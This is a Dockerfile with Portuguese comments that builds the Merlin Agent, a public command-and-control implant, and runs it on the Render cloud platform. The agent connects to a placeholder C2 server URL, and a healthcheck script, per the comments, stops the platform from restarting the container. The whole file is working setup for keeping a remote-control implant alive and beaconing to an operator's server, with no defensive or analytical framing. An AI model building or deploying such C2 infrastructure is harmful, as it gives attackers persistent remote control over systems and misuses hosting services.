# Stage 1: Build (Compilação do código fonte)
FROM golang:1.23-bookworm AS builder

WORKDIR /app

# Clone do repositório oficial do Merlin Agent
RUN git clone https://github.com/Ne0nd0g/merlin-agent.git .

# Tenta compilar o binário. Se o main.go estiver em uma subpasta, o Go encontrará via go.mod
RUN go build -ldflags="-s -w" -o merlin-agent .

# Stage 2: Runtime (Imagem final leve para o Render)
FROM debian:12-slim

# Instalação mínima para rodar o Agente e o Healthcheck
RUN apt-get update && apt-get install -y --no-install-recommends \
    ca-certificates \
    python3 \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /app

# Copia o binário compilado do estágio anterior
COPY --from=builder /app/merlin-agent .

# Copia o script de saúde
COPY healthcheck.py .

# Porta automática do Render
ENV PORT=10000

# Variável para a URL do seu Servidor C2 (Configurável no painel do Render)
ENV MERLIN_URL="https://seu-servidor-c2.onrender.com"

# Execução Automática:
# 1. Inicia o Health Check para o Render não reiniciar o container
# 2. Inicia o Merlin Agent conectando à URL configurada
CMD python3 healthcheck.py & ./merlin-agent -url $MERLIN_URL
